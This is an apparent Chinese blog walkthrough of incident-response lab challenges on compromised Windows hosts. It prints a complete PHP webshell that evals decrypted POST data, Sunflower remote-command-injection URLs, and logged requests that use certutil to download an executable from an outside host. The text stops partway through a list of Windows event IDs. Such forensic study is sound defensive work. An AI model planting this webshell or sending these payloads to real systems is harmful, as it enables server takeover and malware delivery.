<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="刷"><title>玄机第四章</title><link rel=canonical href=https://baozongwi.xyz/p/xuanji-chapter-4/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="玄机第四章"><meta property='og:description' content="刷"><meta property='og:url' content='https://baozongwi.xyz/p/xuanji-chapter-4/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='应急响应'><meta property='article:tag' content='日志分析'><meta property='article:published_time' content='2025-04-07T17:56:28+00:00'><meta property='article:modified_time' content='2025-04-07T17:56:28+00:00'><meta name=twitter:title content="玄机第四章"><meta name=twitter:description content="刷"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#第四章-windows实战-emlog>第四章 windows实战-emlog</a><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3>flag3</a></li><li><a href=#flag4>flag4</a></li></ol></li><li><a href=#第四章-windows实战-向日葵>第四章 windows实战-向日葵</a><ol><li><a href=#flag1-1>flag1</a></li><li><a href=#flag2-1>flag2</a></li><li><a href=#flag3-1>flag3</a></li><li><a href=#flag4-1>flag4</a></li><li><a href=#flag5>flag5</a></li></ol></li><li><a href=#第四章-windows日志分析>第四章-windows日志分析</a><ol><li><a href=#flag1-2>flag1</a></li><li><a href=#flag2-2>flag2</a></li><li><a href=#flag3-2>flag3</a></li><li><a href=#flag4-2>flag4</a></li><li><a href=#flag5-1>flag5</a></li><li><a href=#flag6>flag6</a></li><li><a href=#flag7>flag7</a></li><li><a href=#flag8>flag8</a></li></ol></li><li><a href=#第四章-windows实战-wordpress>第四章 windows实战-wordpress</a><ol><li><a href=#flag1-3>flag1</a></li><li><a href=#flag2-3>flag2</a></li><li><a href=#flag3-3>flag3</a></li><li><a href=#flag4-3>flag4</a></li><li><a href=#flag5-2>flag5</a></li><li><a href=#flag6-1>flag6</a></li></ol></li><li><a href=#第四章-windows实战黑页篡改>第四章 windows实战&ndash;黑页&&篡改</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E7%8E%84%E6%9C%BA/>玄机</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/xuanji-chapter-4/>玄机第四章</a></h2><h3 class=article-subtitle>刷</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Apr 07, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>3 minute read</time></div></footer></div></header><section class=article-content><p>闲着没有事，做做玄机吧</p><h2 id=第四章-windows实战-emlog>第四章 windows实战-emlog</h2><p>首先看到步骤说什么RDP啥啥的，我连RDP是什么都不知道，一搜原来是远程桌面链接啊，这个我知道，那直接在搜索框里面<code>远程桌面</code>，第一个就是打开之后可以进行靶机的链接</p><h3 id=flag1>flag1</h3><p>进来之后发现有个phpstudy，这个是可以起网站的，我们直接把www目录打包带走，然后放D盾里面梭哈一下，本来想偷懒的，因为看到有一个www.zip了，但是后来试了之后发现还是要自己拖出来，不能用他有的压缩文件</p><p><code>\WWW\WWW\content\plugins\tips\shell.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$key</span><span class=o>=</span><span class=s2>&#34;e45e329feb5d925b&#34;</span><span class=p>;</span> <span class=c1>//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>session_write_close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=nv>$post</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>extension_loaded</span><span class=p>(</span><span class=s1>&#39;openssl&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$t</span><span class=o>=</span><span class=s2>&#34;base64_&#34;</span><span class=o>.</span><span class=s2>&#34;decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$post</span><span class=o>=</span><span class=nv>$t</span><span class=p>(</span><span class=nv>$post</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$post</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    			 <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$key</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>    			<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$post</span><span class=o>=</span><span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$post</span><span class=p>,</span> <span class=s2>&#34;AES128&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$arr</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$post</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$func</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$params</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>C</span><span class=p>{</span><span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(</span><span class=nv>$p</span><span class=p>)</span> <span class=p>{</span><span class=k>eval</span><span class=p>(</span><span class=nv>$p</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);}}</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>call_user_func</span><span class=p>(</span><span class=k>new</span> <span class=nx>C</span><span class=p>(),</span><span class=nv>$params</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>flag{rebeyond}</code></p><h3 id=flag2>flag2</h3><p>寻找攻击成功的IP，直接查看日志，寻找<code>shell.php</code></p><p><img src=/p/xuanji-chapter-4/QQ20250407-181609.jpg width=1506 height=1037 srcset="/p/xuanji-chapter-4/QQ20250407-181609_hu_e2458c14fb440227.jpg 480w, /p/xuanji-chapter-4/QQ20250407-181609_hu_7d2aeb5a958df45b.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=145 data-flex-basis=348px></p><p>找到IP，<code>flag{192.168.126.1}</code></p><h3 id=flag3>flag3</h3><p><img src=/p/xuanji-chapter-4/QQ20250407-181748.jpg width=1528 height=1093 srcset="/p/xuanji-chapter-4/QQ20250407-181748_hu_1fc4768b69758dcf.jpg 480w, /p/xuanji-chapter-4/QQ20250407-181748_hu_7a60b5eb3dd8cad7.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=139 data-flex-basis=335px></p><p><code>flag{hacker138}</code></p><h3 id=flag4>flag4</h3><p>在黑客用户的桌面发现了<code>Kuang</code>文件，搞出来之后发现是个exe文件，肯定是看不了的，先下载一个工具，<a class=link href=https://github.com/extremecoders-re/pyinstxtractor target=_blank rel=noopener>pyinstxtractor</a>下载好了之后，把文件放在同一目录下，运行<code>python pyinstxtractor.py Kuang.exe</code>，找到一个<code>Kuang.pyc</code>，放到010搜索就可以了</p><p><img src=/p/xuanji-chapter-4/QQ20250407-182742.jpg width=1877 height=1010 srcset="/p/xuanji-chapter-4/QQ20250407-182742_hu_e5d147fc23c2c845.jpg 480w, /p/xuanji-chapter-4/QQ20250407-182742_hu_ec647eaaceabcd38.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=185 data-flex-basis=446px></p><p><code>flag{wakuang.zhigongshanfang.top}</code>，但是为什么这是PY编译的文件呢，原因很简单，</p><p>首先查看文件头是不是<code>MZ</code>，然后进行第二步</p><ol><li><strong>搜索 <code>PyInstaller</code></strong><ul><li>按 <code>Ctrl+F</code> → 选择 <strong>文本搜索</strong> → 输入 <code>PyInstaller</code></li><li>如果找到，说明是 PyInstaller 打包的。</li></ul></li><li><strong>搜索 <code>PYZ</code>（PyInstaller 的压缩包标记）</strong><ul><li>同样搜索 <code>PYZ</code>，如果能找到，说明是 Python 打包的。</li></ul></li><li><strong>搜索 <code>python</code> 或 <code>.pyc</code></strong><ul><li>搜索 <code>python</code> 或 <code>.pyc</code>，可能会发现 Python 运行时相关字符串。</li></ul></li></ol><h2 id=第四章-windows实战-向日葵>第四章 windows实战-向日葵</h2><p>向日葵一个远程的软件，还是本地RDP，我们首先查查向日葵的RCE知道是可以进行</p><p>目录遍历攻击：尝试访问和下载敏感文件。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
</span></span></code></pre></td></tr></table></div></div><p>命令注入攻击：通过 URL 参数执行系统命令。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami
</span></span></code></pre></td></tr></table></div></div><h3 id=flag1-1>flag1</h3><p>那就很好在日志里面找了，日志我们从最早的开始看，当然找不到就要接着找</p><p><img src=/p/xuanji-chapter-4/QQ20250407-184342.jpg width=1550 height=1149 srcset="/p/xuanji-chapter-4/QQ20250407-184342_hu_47025e48207b0436.jpg 480w, /p/xuanji-chapter-4/QQ20250407-184342_hu_b2b667ef40d93c2e.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=134 data-flex-basis=323px></p><p>并且可以看到确实是利用的这个RCE</p><p><img src=/p/xuanji-chapter-4/QQ20250407-184538.jpg width=1923 height=965 srcset="/p/xuanji-chapter-4/QQ20250407-184538_hu_7aa735928ef0cf9f.jpg 480w, /p/xuanji-chapter-4/QQ20250407-184538_hu_79e839291da6333d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=199 data-flex-basis=478px></p><p>直接找执行命令whoami，找到是<code>2024-03-26 10:16:25.585</code>，包起来就好了</p><h3 id=flag2-1>flag2</h3><p>找IP，就在同一行<code>flag{192.168.31.45}</code></p><h3 id=flag3-1>flag3</h3><p>同一个日志里面找了找</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2024-03-26 10:31:07.576	- Info  -	[service][TcpAcceptor] new acceptor 192.168.31.45:49329--&gt;192.168.31.114:49724
</span></span><span class=line><span class=cl>2024-03-26 10:31:07.576	- Info  -	[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49329, path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe, version: HTTP/1.1
</span></span><span class=line><span class=cl>2024-03-26 10:31:07.576	- Info  -	[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49329,/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1
</span></span></code></pre></td></tr></table></div></div><p>看着像是利用powershell进行反弹shell，直接交<code>flag{192.168.31.249}</code></p><h3 id=flag4-1>flag4</h3><p>找到这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2024-03-26 10:39:11.031	- Info  -	[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884, path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo+647224830+%3E+qq.txt, version: HTTP/1.1
</span></span><span class=line><span class=cl>2024-03-26 10:39:11.031	- Info  -	[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884,/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo+647224830+%3E+qq.txt, plugin:check, session:ciiHpsOHS1UtC5ZfZMrA1gApw9htv8ph
</span></span></code></pre></td></tr></table></div></div><p>加QQ群得到文件，进行md5提交即可，Windows命令是<code> certutil -hashfile .\DEC.pem MD5</code>，Linux是<code>md5sum DEC.pem</code>，得到<code>flag{5ad8d202f80202f6d31e077fc9b0fc6b}</code></p><h3 id=flag5>flag5</h3><p>桌面加密文件内容如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>onEDpnamFbekYxixEQ30W6ZcEXjCUrKHP+APxzuJQZD8bS+4V5Tu+7XmxT24EuNSfoGnda+obAmy2d1E2WT/0MmT4VHNIUyX15JuOcd477c7Zj5v3qtzoJk8Rmtub9RL0vDDjwYKPzyS4wxSyqhRfggenLiSFxhrY32nnf42W30=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Your files have been encrypted
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>X6cNmnKCuxdTl+f5XLhmYY4oFovJGebCmpP94be/VVqNQe0cLJm3RtX84MO98b8fI0zY50xC4OjK5aHOz2zFxCvxHygFR+rIgL0XC2rruzCAukTLJqjjbNRH06alTMMdrxhRVdrC73PMBQBweyProof4ZYNZ4YHnZrej6Vq/Ipr2xeUqamHkysjFPNqA8DVDuXYYlTUuDzZdPZpWM3IDbUDMNi4ilrPEe47IXAxd8nrqTHgX+3X7YiOjuayqK8li2c2xMXoXuSce+rAeNsWHv9SUEqUTP+MJHll7MGYLZSvYpkCVacP3joKJoI/bfoVRX8FlCuCMkicFnTawY0ZxKiX7f+0Wv+KYP0st5SYjWhMWklNSEEG7TH24wZeCANjf
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Your files have been encrypted
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=
</span></span></code></pre></td></tr></table></div></div><p>还有上一题的<code>DEC.pem</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA Private key-----
</span></span><span class=line><span class=cl>MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE
</span></span><span class=line><span class=cl>J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc
</span></span><span class=line><span class=cl>HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB
</span></span><span class=line><span class=cl>AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0
</span></span><span class=line><span class=cl>8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp
</span></span><span class=line><span class=cl>1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv
</span></span><span class=line><span class=cl>MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB
</span></span><span class=line><span class=cl>gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De
</span></span><span class=line><span class=cl>HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C
</span></span><span class=line><span class=cl>mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt
</span></span><span class=line><span class=cl>trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk
</span></span><span class=line><span class=cl>zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb
</span></span><span class=line><span class=cl>xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g
</span></span><span class=line><span class=cl>-----END RSA Private key-----
</span></span></code></pre></td></tr></table></div></div><p>所以应该是RSA加AES进行在线解密，用在线网站<a class=link href=https://try8.cn/tool/cipher/rsa target=_blank rel=noopener>RSA</a> <a class=link href=https://the-x.cn/cryptography/Aes.aspx target=_blank rel=noopener>AES</a></p><p><img src=/p/xuanji-chapter-4/QQ%E6%88%AA%E5%9B%BE20250407185957.png width=1055 height=1259 srcset="/p/xuanji-chapter-4/QQ%E6%88%AA%E5%9B%BE20250407185957_hu_a04f1cf0790a8765.png 480w, /p/xuanji-chapter-4/QQ%E6%88%AA%E5%9B%BE20250407185957_hu_4a8ebb8a8310af4.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=83 data-flex-basis=201px></p><p><img src=/p/xuanji-chapter-4/QQ20250407-190335.jpg width=1809 height=713 srcset="/p/xuanji-chapter-4/QQ20250407-190335_hu_6f0898f077ec782.jpg 480w, /p/xuanji-chapter-4/QQ20250407-190335_hu_98c78422dbd12bb.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=253 data-flex-basis=608px></p><p>这里不是很明白为什么来的，就当个了解吧</p><h2 id=第四章-windows日志分析>第四章-windows日志分析</h2><p>首先来peterpan的博客进行信息收集看看有没有什么值得的知识</p><p><strong>安全日志相关事件 ID</strong>：</p><ul><li><p><strong>4624</strong> - 成功的账户登录事件
记录登录的账号、时间、来源 IP 等信息，可帮助识别是否有非法登录。</p></li><li><p><strong>4625</strong> - 账户登录失败事件
记录未能登录的尝试，帮助检测密码爆破或非法访问。</p></li><li><p><strong>4634</strong> - 用户注销事件
